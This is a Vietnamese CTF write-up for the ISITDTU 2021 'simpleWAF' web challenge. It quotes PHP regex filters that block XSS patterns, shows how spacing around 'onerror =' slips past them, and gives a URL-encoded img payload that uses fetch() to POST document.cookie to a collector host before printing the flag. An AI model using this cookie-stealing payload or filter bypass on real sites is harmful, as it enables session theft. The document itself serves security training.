# simpleWAF


[Source](https://github.com/antoinenguyen-09/All_CTF_write-ups/tree/master/ISITDTU%20CTF/2021/web/simpleWAF/source)


Đây là challenge web đầu và cũng là dễ nhất trong 4 challenge của ISITDTU CTF năm nay. Dù vậy vì một số lí do ngu người nên mất cả buối sáng mình mới solve đc bài này.

### 1. Initial reconnaissance:

![image](https://user-images.githubusercontent.com/61876488/143764818-b63dd063-04cf-4de2-afe7-6fa69f0d859c.png)

- Nhìn qua challenge này cho hẳn source với rất nhiều regex, cùng với một cái url parameter to tướng ở phía trên tên là **XSS** thì chắc chắn hướng đi sẽ là từ [reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) lấy cookie của client. 
- Đề bài còn cho biết: `if you can steal cookie, bot will check it at here`, nghĩa là sau khi exploit lấy cookie thành công từ site chính rồi, chúng ta sẽ submit payload cho con bot dưới đây check xem có hợp lệ và nếu đúng nó sẽ trả cho chúng ta flag.

![image](https://user-images.githubusercontent.com/61876488/143770699-6dc9cc9b-9879-4be6-a6ca-186c8bac69c4.png)

### 2. Analyze and find the vulnerabilities:

- Đầu tiên, website sẽ lấy ra string từ url parameter `xss` rồi check xem nó đã đc url encode chuẩn chưa (thông qua vòng while). Sau đó nếu như trong string đó có các [HTML entities](https://www.w3schools.com/html/html_entities.asp) thì nó sẽ trở về dạng HTML tag bình thường thông qua hàm `html_entity_decode`.

```php
$xss = $_GET['xss'];

$tmpxss = $xss;
do
{
    $xss = $tmpxss;
    $tmpxss = urldecode($xss);
} while($tmpxss != $xss);

$xss = html_entity_decode($xss);
```

- Tiếp theo là phần phải đụng cơ tay một tí là bypass regex. Nhìn qua ta có thể thấy regex sẽ filter các string như `on<gì đó>=`, `src=`, `href=`, `<script`, `<object` nếu nó xuất hiện trong biến **$xss** ở trên. Nếu có xuất hiện sẽ in ra `WAF block`, nếu không thì payload là hợp lệ và sẽ được in ra

```php 
$valid = true;
if(preg_match("/\<\w+.*on\w+=.*/i", $xss))
{
    $valid = false;
}

if(preg_match("/\<\w+.*src=.*/i", $xss))
{
    $valid = false;
}

if(preg_match("/\<\w+.*href=.*/i", $xss))
{
    $valid = false;
}

if(preg_match("/\<script.*/i", $xss))
{
    $valid = false;
}

if(preg_match("/\<object.*/i", $xss))
{
        $valid = false;
}

if($valid == true)
{
    echo $xss;
}
else
{
    echo "WAF block";
}
```

- Các string như `on<gì đó>=`, `src=`, `href=`, `<script`, `<object` thường xuất hiện trong các xss payload, giờ đã bị ban. Vậy thì làm sao để nó hợp lệ? Chợt nhận ra thằng web này nó chỉ cấm mình dùng `on<gì đó>=` chứ không cấm mình dùng `on<gì đó> =` (thêm 1 dấu cách vào, thâm chí muốn chắc kèo thêm kí tự `\n` vào cũng được luôn). Thí dụ chúng ta có thể xài một cái payload như này:

![image](https://user-images.githubusercontent.com/61876488/143773209-5d07eee5-5b17-498b-ad75-e9ea595ab3b1.png)

- Dùng payload `w` rồi thử alert một cái chơi:

![image](https://user-images.githubusercontent.com/61876488/143773362-d7eec521-a23b-4005-9ab5-2095e14b2627.png)

Amazing, giờ viết script để gửi cookie về domain của mình thôi!

### 3. Exploit and get flag:

- Ý tưởng về việc steal cookie nó sẽ tóm gọn như này (sủ dụng [fetch API](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch)): 

```javascript
fetch('<URL muốn gửi đến>', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
```
- Nhét nó vào payload để chạy trên web này nó sẽ thành như sau:

```
%3Cimg%20src/%20%0Donerror%0D%20=%22fetch(%27<URL muốn gửi đến>%27,%20{method:%20%27POST%27,%20mode:%20%27no-cors%27%20,body:document.cookie})%22%3E
```

- Ví dụ ta có url muốn gửi đến là `https://jxkku1rri7bor6fs1hjaeu4yyp4fs4.burpcollaborator.net` (sử dụng [Burp Collaborator client](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client) để tạo các domain như này, đồng thời bắt các request gửi về khi payload chạy):

![image](https://user-images.githubusercontent.com/61876488/143773913-d5425ee3-7ba7-4b17-903e-c1745f5c11cb.png)

- Tiếp theo mình sẽ submit cái nguyên si cái payload này cho con bot để lấy flag và tiếp tục sử dụng Burp Collaborator client để bắt request, và đây là nơi cái ngu bắt đầu :).

![image](https://user-images.githubusercontent.com/61876488/143774022-ae572395-e947-444b-85b6-4a4afc68f653.png)
 
- Không hiểu bằng một cách magic nào mà lần này nó chỉ gửi mỗi DNS request đến Burp Collaborator client, trong khi thứ ta đang cần là một HTTP request như ảnh trên :(. Mình đã tốn thời gian cho một việc ngu ngốc là gửi đi gửi lại dù biết nó sẽ sai, cho đến khi được người ra đề là anh "0xd0ff9" gõ đầu mới ngộ ra:

![image](https://user-images.githubusercontent.com/61876488/143774177-8f380b14-b5d1-44b8-ab92-56f52b32cda0.png)

Có vẻ có vấn đề gì đó với policy của Chrome phiên bản mới nhất, sau một hồi search gg và hỏi khắp nới thì t biết được policy của chrome mới nhất ko cho phép redirect qua http, do đó Burp Collaborator client sẽ không bắt được HTTP. Nhưng mà trước khi biết được điều này thì t đã mò đại được cái webhook hay ho https://requestcatcher.com/ này để bắt request, và nó đã hoạt động :D

![image](https://user-images.githubusercontent.com/61876488/143775278-0fd6ae7b-b568-4aed-aacd-4040af89a807.png)

![image](https://user-images.githubusercontent.com/61876488/143775285-b2183718-ad8e-4ba4-b72d-0bf8a88794db.png)

Flag: `ISITDTU{64858f4560416acff930bf673b5046911947a26e}`





